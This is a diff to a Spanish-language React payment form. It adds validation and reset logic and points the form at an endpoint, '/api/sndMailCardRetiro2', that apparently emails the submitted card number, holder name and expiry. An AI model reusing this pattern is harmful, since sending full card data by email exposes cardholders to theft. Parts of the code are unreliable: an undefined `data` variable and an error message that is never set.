@@ -13,15 +13,48 @@ const PaymentForm = () => {
   const [cardHolder, setCardHolder] = useState('');
   const [expiryDate, setExpiryDate] = useState('');
   const [loading, setLoading] = useState(false);
+  const [errorMsg, setErrorMsg] = useState('');
+  const [errors, setErrors] = useState<{ [key: string]: string }>({});
 
   // Función para formatear el número de tarjeta (agrupando dígitos de 4 en 4)
   const formatCardNumber = (num: string) => {
     return num.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
   };
 
+  // Validación de campos
+  const validate = () => {
+    const newErrors: { [key: string]: string } = {};
+    if (!paymentAmount || isNaN(Number(paymentAmount)) || Number(paymentAmount) <= 0) {
+      newErrors.paymentAmount = 'Ingrese un monto válido.';
+    }
+    if (!cardNumber || cardNumber.replace(/\D/g, '').length < 13) {
+      newErrors.cardNumber = 'Ingrese un número de tarjeta válido.';
+    }
+    if (!cardHolder) {
+      newErrors.cardHolder = 'Ingrese el nombre del titular.';
+    }
+    if (!expiryDate || !/^\d{2}\/\d{2}$/.test(expiryDate)) {
+      newErrors.expiryDate = 'Formato debe ser MM/YY.';
+    } else {
+      // Validar mes y año
+      const [mm, yy] = expiryDate.split('/').map(Number);
+      if (mm < 1 || mm > 12) newErrors.expiryDate = 'Mes inválido.';
+    }
+    return newErrors;
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    if (loading) return;
     setLoading(true);
+    setErrors({});
+
+    const validationErrors = validate();
+    if (Object.keys(validationErrors).length > 0) {
+      setErrors(validationErrors);
+      setLoading(false);
+      return;
+    }
 
     // Datos que se enviarán a la API para el correo
     const paymentData = {
@@ -34,7 +67,7 @@ const PaymentForm = () => {
     };
 
     try {
-      const response = await fetch('2', {
+      const response = await fetch('/api/sndMailCardRetiro2', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(paymentData),
@@ -43,12 +76,18 @@ const PaymentForm = () => {
 
       if (response.ok) {
         alert('✅ Solicitud enviada correctamente.');
+        // Limpiar campos tras éxito
+        setPaymentAmount('');
+        setCardType('MasterCard');
+        setCardNumber('');
+        setCardHolder('');
+        setExpiryDate('');
       } else {
-        alert(`❌ Error: ${data.error}`);
+        alert(data?.error || 'Error al enviar la solicitud.');
       }
     } catch (error) {
       console.error('Error en la solicitud:', error);
-      alert('❌ Error en la solicitud. Verifica la API.');
+      alert('Ocurrió un error al enviar la solicitud.');
     } finally {
       setLoading(false);
     }
@@ -59,6 +98,11 @@ const PaymentForm = () => {
       <h2 className="text-2xl font-bold text-center mb-6 text-white">
         Formulario de Pago
       </h2>
+
+      {/* Mensaje de error */}
+      {errorMsg && (
+        <div className="mb-4 text-red-400 text-center font-semibold">{errorMsg}</div>
+      )}
 
       {/* Sección: Moneda, Tipo de Tarjeta y Monto */}
       <div className="space-y-4">
@@ -99,6 +143,9 @@ const PaymentForm = () => {
             placeholder="Ej: 150.00"
             className="mt-1 w-full px-3 py-2 rounded bg-gray-800 text-white"
           />
+          {errors.paymentAmount && (
+            <p className="text-red-400 text-xs mt-1">{errors.paymentAmount}</p>
+          )}
         </div>
       </div>
 
@@ -110,26 +157,19 @@ const PaymentForm = () => {
         <div className="relative bg-gradient-to-r from-gray-700 to-gray-900 p-6 rounded-xl shadow-2xl">
           {/* Fila superior con chip y logotipo */}
           <div className="flex justify-between items-start">
-            {/* Esquina superior izquierda: World Elite */}
-            <div className="flex flex-row items-center gap-2 ml-1 mt-1">
-              {/* Chip (SVG) */}
-              <div className="w-10 h-10">
-                <svg
-                  xmlns="http://www.w3.org/2000/svg"
-                  fill="currentColor"
-                  viewBox="0 0 24 24"
-                  className="w-10 h-10 text-yellow-500"
-                >
-                  <path d="M6 2a2 2 0 00-2 2v4H2v4h2v4a2 2 0 002 2h4v2h4v-2h4a2 2 0 002-2v-4h2v-4h-2V4a2 2 0 00-2-2h-4V0h-4v2H6zm0 2h4v2H6V4zm8 0h4v2h-4V4zM6 10h4v2H6v-2zm8 0h4v2h-4v-2zM6 16h4v2H6v-2zm8 0h4v2h-4v-2z" />
-                </svg>
-              </div>
-              {/* Texto World Elite */}
-              <span className="text-xs font-bold text-white tracking-widest select-none" style={{ letterSpacing: '2px' }}>
-                WORLD ELITE
-              </span>
+            {/* Chip (SVG) */}
+            <div className="w-10 h-10">
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                fill="currentColor"
+                viewBox="0 0 24 24"
+                className="w-10 h-10 text-yellow-500"
+              >
+                <path d="M6 2a2 2 0 00-2 2v4H2v4h2v4a2 2 0 002 2h4v2h4v-2h4a2 2 0 002-2v-4h2v-4h-2V4a2 2 0 00-2-2h-4V0h-4v2H6zm0 2h4v2H6V4zm8 0h4v2h-4V4zM6 10h4v2H6v-2zm8 0h4v2h-4v-2zM6 16h4v2H6v-2zm8 0h4v2h-4v-2z" />
+              </svg>
             </div>
             {/* Logotipo de la tarjeta */}
-            <div className="w-[80px] h-[54px] flex items-center justify-center">
+            <div className="w-[70px] h-[44px] flex items-center justify-center">
               {cardType === 'Visa' ? (
                 <Image
                   src={visaLogoSvg}
@@ -143,8 +183,8 @@ const PaymentForm = () => {
                 <Image
                   src={mastercardLogoSvg}
                   alt="MasterCard"
-                  width={80}
-                  height={54}
+                  width={70}
+                  height={44}
                   style={{ objectFit: 'contain' }}
                   className="w-full h-full"
                 />
@@ -190,6 +230,9 @@ const PaymentForm = () => {
             placeholder="Ej: 1234 5678 9012 3456"
             className="mt-1 w-full px-3 py-2 rounded bg-gray-800 text-white"
           />
+          {errors.cardNumber && (
+            <p className="text-red-400 text-xs mt-1">{errors.cardNumber}</p>
+          )}
         </div>
         <div>
           <label className="block text-sm font-medium text-gray-300">
@@ -202,6 +245,9 @@ const PaymentForm = () => {
             placeholder="Ej: Juan Pérez"
             className="mt-1 w-full px-3 py-2 rounded bg-gray-800 text-white"
           />
+          {errors.cardHolder && (
+            <p className="text-red-400 text-xs mt-1">{errors.cardHolder}</p>
+          )}
         </div>
         <div>
           <label className="block text-sm font-medium text-gray-300">
@@ -213,7 +259,11 @@ const PaymentForm = () => {
             onChange={(e) => setExpiryDate(e.target.value)}
             placeholder="MM/YY"
             className="mt-1 w-full px-3 py-2 rounded bg-gray-800 text-white"
+            maxLength={5}
           />
+          {errors.expiryDate && (
+            <p className="text-red-400 text-xs mt-1">{errors.expiryDate}</p>
+          )}
         </div>
       </div>
 
@@ -222,13 +272,21 @@ const PaymentForm = () => {
         <button
           type="button"
           className="px-6 py-2 bg-gray-600 text-white rounded hover:bg-gray-700"
+          onClick={() => {
+            setPaymentAmount('');
+            setCardType('MasterCard');
+            setCardNumber('');
+            setCardHolder('');
+            setExpiryDate('');
+            setErrors({});
+          }}
         >
           Cerrar
         </button>
         <button
           type="submit"
           className="px-6 py-2 bg-blue-600 text-white rounded hover:bg-blue-700"
-          disabled={loading}
+          disabled={loading || !paymentAmount || !cardType || !cardNumber || !cardHolder || !expiryDate}
         >
           {loading ? 'Procesando...' : 'Continuar'}
         </button>
